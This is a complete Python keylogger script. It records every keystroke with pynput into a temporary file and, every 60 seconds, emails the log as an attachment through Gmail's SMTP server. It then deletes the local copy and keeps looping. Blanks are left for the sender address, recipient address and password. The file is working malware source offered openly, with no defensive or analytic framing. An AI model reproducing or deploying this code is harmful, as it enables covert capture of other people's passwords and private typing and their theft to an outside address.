# All imports
from pynput.keyboard import Listener #1
import smtplib #2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket #3
import tempfile #4
from datetime import date #5
import threading
import time
import os

# functions
def writetofile(key):
    char = str(key)
    char = char.replace("'", "")
    # replacing keystrokes in file.txt with actual meaning
    keystroke = ['Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
    value = ["", " ", "\n", '<backspace>', '']
    for j in range(len(keystroke)):
        if keystroke[j] == char:
            char = char.replace(keystroke[j], value[j])
    with open(filename, 'a') as f:
        f.write(char)
        
def emailsender():
    fromadd = "---" #add from address
    toadd = "---" #add to address

    msg = MIMEMultipart()

    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = 'Keylogger' # add subject here

    msg.attach(MIMEText('log', 'plain')) # write body here

    #extension imp
    attachment = open(filename, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpobj.ehlo()
    smtpobj.starttls()
    smtpobj.login(fromadd ,'---') # add password 
    text = msg.as_string()
    smtpobj.sendmail(fromadd , toadd , text)
    smtpobj.quit() 
    
def is_connected():
    try:
        socket.create_connection(('www.google.com', 80))
        return True
    except OSError:
        pass
        return False

        
def filecreation():
    save = tempfile.mkdtemp('file') 
    print (save)
    global filename
    filename = save + '\\keylg' + '.txt'
    a = open (filename, "w+")
    a.write(str(date.today())+"\n") 

# main    
filecreation()

if is_connected() == True:
    def join():
        with Listener(on_press=writetofile) as ls:
            period_sec=10
            def time_out(period_sec: int):
                time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
                ls.stop()
                emailsender()
                os.remove(filename)
                filecreation()
                
            threading.Thread(target=time_out, args=(60.0,)).start() #listening for 60 seconds. 
            ls.join()
    
    while True:
        join()
